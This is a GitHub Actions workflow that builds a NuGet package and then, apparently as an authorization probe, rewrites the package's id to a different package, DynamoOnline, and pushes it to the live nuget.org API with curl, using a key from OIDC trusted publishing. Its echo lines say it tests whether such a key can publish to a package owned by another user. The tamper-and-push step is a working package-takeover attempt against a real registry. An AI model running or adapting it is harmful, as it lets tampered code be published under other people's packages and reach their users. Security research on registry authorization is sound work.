name: Publish to NuGet

on:
  push:
    tags: ['v*']

permissions:
  id-token: write
  contents: read

jobs:
  publish:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    
    steps:
      - uses: actions/checkout@v4
      
      - uses: actions/setup-dotnet@v4
        with:
          dotnet-version: '8.0.x'
      
      - name: Build and Pack
        run: |
          dotnet build -c Release
          dotnet pack -c Release -o ./artifacts --no-build

      - name: NuGet Login
        uses: NuGet/login@v1
        id: login
        with:
          user: ${{ secrets.NUGET_USER }}
      
      - name: Push to DynamoOnline (owned by you)
        run: |
          cd artifacts
          ORIG_PKG=$(ls *.nupkg)
          
          # Create new version for DynamoOnline
          rm -rf tampered && mkdir tampered
          unzip -q -o "$ORIG_PKG" -d tampered
          find tampered -name "*.nuspec" -exec sed -i "s|<id>DynamoTest456</id>|<id>DynamoOnline</id>|g" {} \;
          find tampered -name "*.nuspec" -exec sed -i "s|<version>1.0.0</version>|<version>2.0.0</version>|g" {} \;
          cd tampered && zip -q -r ../dynamo.nupkg . && cd ..
          
          echo "=== Current NUGET_USER is: ==="
          echo "Check secrets - this should be @joseph or whoever owns DynamoOnline"
          
          echo -e "\n=== Push DynamoOnline 2.0.0 ==="
          curl -s -w "\nHTTP:%{http_code}" -X PUT "https://www.nuget.org/api/v2/package/" \
            -H "X-NuGet-ApiKey: $NUGET_KEY" \
            -H "X-NuGet-Client-Version: 6.0.0" \
            -H "X-NuGet-Protocol-Version: 4.1.0" \
            -H "Content-Type: application/octet-stream" \
            --data-binary @dynamo.nupkg
          
          echo -e "\n\n=== If that worked, the OIDC key from trusted publishing can push to DynamoOnline ==="
          echo "=== Now the question is: can a DIFFERENT user's policy also get a key that works? ==="

        env:
          NUGET_KEY: ${{ steps.login.outputs.NUGET_API_KEY }}
